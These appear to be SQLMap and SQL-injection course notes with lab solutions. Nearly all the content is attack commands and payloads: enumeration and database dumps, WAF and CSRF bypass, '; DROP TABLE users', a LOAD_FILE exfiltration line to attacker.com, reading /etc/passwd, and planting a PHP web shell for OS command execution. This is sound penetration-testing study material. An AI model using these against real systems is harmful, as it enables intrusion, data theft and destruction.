
# SQLMap Overview 

**Installation**

```bash
sudo apt install sqlmap
```

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

```bash
python sqlmap.py
```

**Basic Usage**

```bash
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

**Help**

```bash
sqlmap -hh
```

**Technique Flag**

```text
--technique=TECH..
```

**SQLi Payload Examples**

```sql
AND 1=1
```

```sql
AND GTID_SUBSET(@@version,0)
```

```sql
UNION ALL SELECT 1,@@version,3
```

```sql
; DROP TABLE users
```

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

```sql
SELECT (SELECT @@version) from
```

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

---


# Getting Started with SQLMap 

**Help Flags**

```bash
sqlmap -h
```

```bash
sqlmap -hh
```

**Vulnerable PHP Code (Reference)**

```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

**Target URL**

```http
http://www.example.com/vuln.php?id=1
```

**Basic Scan with Auto-defaults**

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

**Identified Payloads from Scan Output**

```text
id=1 AND 8814=8814
```

```text
id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```

```text
id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)
```

```text
id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
```

**Key Flags Referenced**

```text
-u URL
--batch
-h
-hh
-v VERBOSE
-d DIRECT
-l LOGFILE
-m BULKFILE
-r REQUESTFILE
-g GOOGLEDORK
-c CONFIGFILE
-A AGENT
-H HEADER
--method=METHOD
--data=DATA
--param-del=PARA..
--cookie=COOKIE
--cookie-del=COO..
```

---


# SQLMap Output Description 

**Heuristic Injection Trigger Value (Example)**

```text
?id=1",)..).))'
```

**String Anchor Flag (Referenced in Output)**

```text
--string="luther"
```

**Session/Output Log Path**

```text
/home/user/.sqlmap/output/www.example.com
```

**Log Message Identifiers (Reference)**

```text
"target URL content is stable"
"GET parameter 'id' appears to be dynamic"
"heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"
"heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"
"it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? Y/n"
"for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? Y/n"
"reflective value(s) found and filtering out"
"GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"
"time-based comparison requires a larger statistical model, please wait........... (done)"
"automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"
"'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"
"GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? y/N"
"sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"
"fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"
```

---


# Running SQLMap on an HTTP Request

**cURL-converted SQLMap Command**

```bash
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

**POST Data Scan**

```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

**POST Data with Injection Marker**

```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

**Scan from Request File**

```bash
sqlmap -r req.txt
```

**Burp-captured HTTP Request File (req.txt)**

```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

**Injection Marker in Request File Path**

```text
/?id=*
```

**Cookie via --cookie**

```bash
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

**Cookie via -H**

```bash
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

**Cookie Header Injection Marker**

```text
--cookie="id=1*"
```

**Other Header Flags**

```text
--host
--referer
-A / --user-agent
--random-agent
--mobile
```

**Custom HTTP Method**

```bash
sqlmap -u www.target.com --data='id=1' --method PUT
```

**JSON Request File (req.txt)**

```http
HTTP / HTTP/1.0
Host: www.example.com
{
  "data": [{
   "type": "articles",
   "id": "1",
   "attributes": {
     "title": "Example JSON",
     "body": "Just an example",
     "created": "2020-05-22T14:56:29.000Z",
     "updated": "2020-05-22T14:56:28.000Z"
   },
   "relationships": {
     "author": {
       "data": {"id": "42", "type": "user"}
     }
   }
  }]
}
```

**Auto-find Parameter Flags**

```text
--crawl
--forms
-g
-p uid
```

---


# Handling SQLMap Errors 

**Parse DBMS Errors**

```text
--parse-errors
```

**Store Traffic to File**

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

**Read Stored Traffic**

```bash
cat /tmp/traffic.txt
```

**Verbose Output (Max Level)**

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

**Proxy Through Burp**

```text
--proxy
```

**Traffic Output File Path**

```text
/tmp/traffic.txt
```

---


# Attack Tuning 

**Prefix and Suffix**

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

**Vulnerable PHP Code (Reference)**

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

**Resulting Injected SQL Statement**

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

**Level and Risk**

```bash
sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```

**View Payloads at Verbosity 3 with Level 5**

```bash
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

**Default Run (Baseline Comparison)**

```bash
sqlmap -u www.example.com/?id=1
```

**Status Code Detection**

```text
--code=200
```

**Title-based Detection**

```text
--titles
```

**String-based Detection**

```text
--string=success
```

**Text-only Comparison**

```text
--text-only
```

**Technique Restriction**

```text
--technique=BEU
```

**UNION Column Count**

```text
--union-cols=17
```

**UNION Fill Character**

```text
--union-char='a'
```

**UNION FROM Appendix**

```text
--union-from=users
```

---


# Database Enumeration 

**Basic DB Info Enumeration**

```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

**Table Enumeration**

```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

**Dump Specific Table**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

**Dump Specific Columns**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

**Dump Row Range**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

**Conditional Dump**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

**Dump Entire Database**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D testdb
```

**Dump All Databases Excluding System DBs**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
```

**Flags Reference**

```text
--banner
--current-user
--current-db
--is-dba
--hostname
--passwords
--tables
--dump
--dump-all
--dump-format
--exclude-sysdbs
-D testdb
-T users
-C name,surname
--start=2
--stop=3
--where="name LIKE 'f%'"
```

**Dump Output Path**

```text
/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv
```

**queries.xml Excerpt (MySQL)**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <dbms value="MySQL">
       <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
       <cast query="CAST(%s AS NCHAR)"/>
       <length query="CHAR_LENGTH(%s)"/>
       <isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/>
       <current_user query="CURRENT_USER()"/>
       <current_db query="DATABASE()"/>
       <hostname query="@@HOSTNAME"/>
       <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
       <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
       <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
       <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
       <users>
           <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
           <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
       </users>
   ...SNIP...
```

---

# Advanced Database Enumeration 

**Schema Enumeration**

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

**Search Tables by Keyword**

```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

**Search Columns by Keyword**

```bash
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

**Dump Table with Password Hashes**

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

**Dump DB User Password Hashes**

```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

**Full Auto Enumeration**

```bash
sqlmap -u "http://www.example.com/?id=1" --all --batch
```

**Flags Reference**

```text
--schema
--search
-T user
-C pass
--passwords
--all
--batch
```

**Default Wordlist Path**

```text
/usr/local/share/sqlmap/data/txt/wordlist.tx_
```

**Output Path**

```text
/home/user/.local/share/sqlmap/output/www.example.com
```

---

# Bypassing Web Application Protections 

**Anti-CSRF Token Bypass**

```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

**Unique Value Randomization**

```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

**Calculated Parameter (MD5 Hash Example)**

```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

**Proxy**

```text
--proxy="socks4://177.39.187.70:33283"
```

**Proxy File**

```text
--proxy-file
```

**Tor**

```text
--tor
--check-tor
```

**Skip WAF Detection**

```text
--skip-waf
```

**Random User-Agent**

```text
--random-agent
```

**Tamper Scripts**

```text
--tamper=between,randomcase
--list-tampers
```

**Chunked Encoding**

```text
--chunked
```

**HTTP Parameter Pollution Example**

```http
?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...
```

**Tamper Script Names**

```text
0eunion
base64encode
between
commalesslimit
equaltolike
halfversionedmorekeywords
modsecurityversioned
modsecurityzeroversioned
percentage
plus2concat
randomcase
space2comment
space2dash
space2hash
space2mssqlblank
space2plus
space2randomblank
symboliclogical
versionedkeywords
versionedmorekeywords
```

**Tor Check URL**

```text
https://check.torproject.org/
```

**WAF Detection Probe Parameter Pattern**

```text
?pfov=...
```

**Default SQLMap User-Agent (Blacklisted)**

```text
User-agent: sqlmap/1.4.9 (http://sqlmap.org)
```

---


# OS Exploitation 

**Check DBA Privileges**

```bash
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

```bash
sqlmap -u "http://www.example.com/?id=1" --is-dba
```

**Read Remote File**

```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

**Read Saved File Locally**

```bash
cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
```

**Write PHP Web Shell Locally**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Write Shell to Remote Server**

```bash
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

**Execute Command via Uploaded Shell**

```bash
curl http://www.example.com/shell.php?cmd=ls+-la
```

**OS Shell (Default)**

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

**OS Shell via Error-based Technique**

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

**PHP Web Shell Payload**

```php
<?php system($_GET["cmd"]); ?>
```

**MySQL Manual File Read (Reference)**

```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
```

**File Read Output Path**

```text
~/.sqlmap/output/www.example.com/files/_etc_passwd
```

**Uploaded Stager/Backdoor Paths (from Output)**

```text
http://www.example.com/tmpumgzr.php
http://www.example.com/tmpbznbe.php
```

**Common Webroot Locations (from --os-shell Prompt)**

```text
/var/www/
/var/www/html
/var/www/htdocs
/usr/local/apache2/htdocs
/usr/local/www/data
/var/apache2/htdocs
/var/www/nginx-default
/srv/www/htdocs
```

**UDF Files (from --os-shell Output)**

```text
sys_exec
sys_eval
```

Looking at the new document against everything already covered, here are the net-new commands and snippets not previously included in any of the prior sections.

# New/Missing Commands

**SQL Injection Fundamentals - Unsafe PHP (not previously included)**

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";

if (!mysqli_query($conn ,$query))
{
        die('Error: ' . mysqli_error($conn));
}

$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result);
```

**Input Sanitization - Escaped Input**

```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
```

**Input Validation - Vulnerable Query**

```php
$q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
$result = pg_query($conn,$q);
```

**Input Validation - Regex Filter**

```php
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
```

**Rejected Injection Test**

```sql
'; SELECT 1,2,3,4-- -
```

**DB User Creation and Grant**

```sql
CREATE USER 'reader'@'localhost';
```

```sql
GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
```

**Verify User Permissions**

```bash
mysql -u reader -p
```

```sql
use ilfreight;
```

```sql
SHOW TABLES;
```

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

```sql
SELECT * FROM ilfreight.credentials;
```

**Prepared Statements (Parameterized)**

```php
$query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);

$row = mysqli_fetch_array($result);
mysqli_stmt_close($stmt);
```

**Lab-specific Commands (session solutions)**

```bash
sqlmap 'http://94.237.123.236:32009/case3.php?id=1' --batch --dump
```

```bash
sqlmap -u "http://94.237.123.236:32009/case2.php" --data="id=1" --dbs "testdb" --tables -T flag2 --dump --batch
```

```bash
sqlmap -u "http://94.237.123.236:32009/case3.php" --cookie="id=1" --batch --level=3 --risk=2
```

```bash
sqlmap -u "http://94.237.123.236:32009/case3.php" --cookie="id=1" --dbs --batch --prefix="%'))" --suffix="-- -"
```

```bash
sqlmap -u "http://94.237.120.119:34618/case5.php?id=1" --dbs --batch --prefix="%'))" --suffix="-- -"
```

```bash
sqlmap -u "http://94.237.123.236:32009/case3.php" --cookie="id=1" -D "testdb" --tables --batch --dump
```

```bash
sqlmap -u "http://94.237.123.236:32009/case3.php" --cookie="id=1" -D <DB_NAME> -T flag3 --dump --batch
```

```bash
sqlmap -r req.txt --batch
```

```bash
sqlmap -r req.txt -D testdb -T flag4 --dump --batch
```

```bash
sqlmap -u "http://94.237.120.119:34618/case5.php?id=1" --level=5 --risk=3 -T flag5 --no-cast --dump
```

```bash
sqlmap -u "http://94.237.120.119:34618/case6.php?col=id" --level=5 --risk=3 -T flag6 --dump --prefix='`)' --suffix="-- -" --batch
```

```sql
?id=1 UNION SELECT 1,2,3,4,5-- -
```

```bash
sqlmap -u "http://94.237.120.119:34618/case7.php?id=1" --union-cols=5 --union-char=1 --dbs --tables -T flag7 --dump --batch
```

```bash
sqlmap -u "http://94.237.61.248:38112/case1.php?id=1" --union-cols=5 --union-char=1 --dbs --tables -T flag1 --dump --batch
```

```bash
sqlmap -u "http://94.237.61.248:38112/case1.php?id=1" --union-cols=5 --union-char=1 --dbs --tables -T flag1 --all --batch
```

```bash
sqlmap -u "http://94.237.61.248:38112/case1.php?id=1" --union-cols=5 --union-char=1 --dbs --tables --search -C style
```

```bash
sqlmap -u "http://94.237.61.248:38112/case8.php" --data="id=1&t0ken=Xp3VVUvlc0PBdWVgCPvJXXo3U1CTysgI3auywwOC4" --csrf-token="t0ken" --batch -D testdb -T flag8 --dump
```

```bash
sqlmap -u "http://94.237.61.248:38112/case9.php?id=1&uid=2224207684" --randomize=uid --batch --dbs --tables
```

```bash
sqlmap -u "http://94.237.61.248:38112/case9.php?id=1&uid=2224207684" --randomize=uid --batch -D testdb -T flag9 --dump
```

```bash
sqlmap 'http://94.237.61.248:38112/case10.php' \
  --compressed \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://94.237.61.248:38112/case10.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://94.237.61.248:38112' \
  -H 'DNT: 1' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: PHPSESSID=53lor2prlne860pmhl3op81f22' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'id=1' --tamper=between --batch -D testdb -T flag10 --dump
```

```bash
sqlmap "http://94.237.61.249:33359/case11.php?id=1" --tamper=between --batch -D testdb -T flag11 --dump
```

```bash
sqlmap -u http://94.237.61.248:41337/?id=1 --file-read "/var/www/html/flag.txt"
```

```bash
sqlmap -u "http://94.237.61.248:41337/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

```bash
sqlmap -u "http://94.237.61.248:41337/?id=1" --os-shell --technique=E
```

```bash
sqlmap 'http://94.237.52.208:36398/action.php' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://94.237.52.208:36398/shop.html' \
  -H 'Content-Type: application/json' \
  -H 'Origin: http://94.237.52.208:36398' \
  -H 'DNT: 1' \
  -H 'Connection: keep-alive' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0' \
  --data-raw '{"id":1}' --tamper=between --batch --dump -T "final_flag"
```

**New Flag Reference**

```text
--no-cast
-X POST
--data-raw
```